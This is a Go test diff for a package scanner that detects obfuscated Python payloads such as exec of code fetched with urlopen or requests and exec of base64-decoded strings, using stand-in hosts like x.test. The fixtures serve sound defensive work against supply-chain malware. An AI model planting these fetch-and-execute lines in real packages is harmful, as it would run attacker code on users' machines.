@@ -291,6 +291,86 @@ func TestDetectSourcePatterns_RubyObfuscation(t *testing.T) {
 	}
 }
 
+// Plan C — Python `exec(urlopen(...))` / `exec(base64.b64decode(...))`.
+// Mirrors the Ruby suite in shape.
+func TestDetectSourcePatterns_PythonObfuscation(t *testing.T) {
+	tests := []struct {
+		name     string
+		filename string
+		body     string
+		wantHas  domain.Capability
+	}{
+		{
+			name:     "exec(urllib.request.urlopen(...).read())",
+			filename: "setup.py",
+			body:     `exec(urllib.request.urlopen('http://x.test/p').read())`,
+			wantHas:  domain.CapObfuscatedPayload,
+		},
+		{
+			name:     "exec(requests.get(...).text)",
+			filename: "pkg/__init__.py",
+			body:     `exec(requests.get('http://x.test').text)`,
+			wantHas:  domain.CapObfuscatedPayload,
+		},
+		{
+			name:     "exec(base64.b64decode(...))",
+			filename: "pkg/loader.py",
+			body:     `exec(base64.b64decode(b"cHJpbnQoJ2hpJyk="))`,
+			wantHas:  domain.CapObfuscatedPayload,
+		},
+		{
+			name:     "exec(compile(base64.b64decode(...), ...))",
+			filename: "pkg/loader.py",
+			body:     `exec(compile(base64.b64decode(b"..."), '<x>', 'exec'))`,
+			wantHas:  domain.CapObfuscatedPayload,
+		},
+		{
+			name:     "eval(urllib.request.urlopen(...))",
+			filename: "pkg/loader.py",
+			body:     `eval(urllib.request.urlopen('http://x.test/p').read())`,
+			wantHas:  domain.CapObfuscatedPayload,
+		},
+		{
+			name:     "exec on local string — not flagged",
+			filename: "pkg/loader.py",
+			body:     `exec("print('hi')")`,
+			wantHas:  0,
+		},
+		{
+			name:     "requests.get without exec — not flagged",
+			filename: "pkg/foo.py",
+			body:     `data = requests.get('http://api.example.test/v1').text`,
+			wantHas:  0,
+		},
+		{
+			name:     ".pyx (Cython) extension also scanned",
+			filename: "pkg/fast.pyx",
+			body:     `exec(base64.b64decode(payload))`,
+			wantHas:  domain.CapObfuscatedPayload,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			caps := DetectSourcePatterns(usecase.PackageSource{
+				Files: map[string][]byte{tt.filename: []byte(tt.body)},
+			})
+			has := false
+			for _, c := range caps {
+				if c == tt.wantHas {
+					has = true
+				}
+			}
+			if tt.wantHas != 0 && !has {
+				t.Errorf("want %v, got %v", tt.wantHas, caps)
+			}
+			if tt.wantHas == 0 && len(caps) != 0 {
+				t.Errorf("want no caps, got %v", caps)
+			}
+		})
+	}
+}
+
 // Sanity: catches the pattern even in minified content (one long line).
 func TestDetectSourcePatterns_Minified(t *testing.T) {
 	js := strings.Repeat("var x=1;", 1000) + `eval(atob("YWJj"))` + strings.Repeat("var y=2;", 1000)
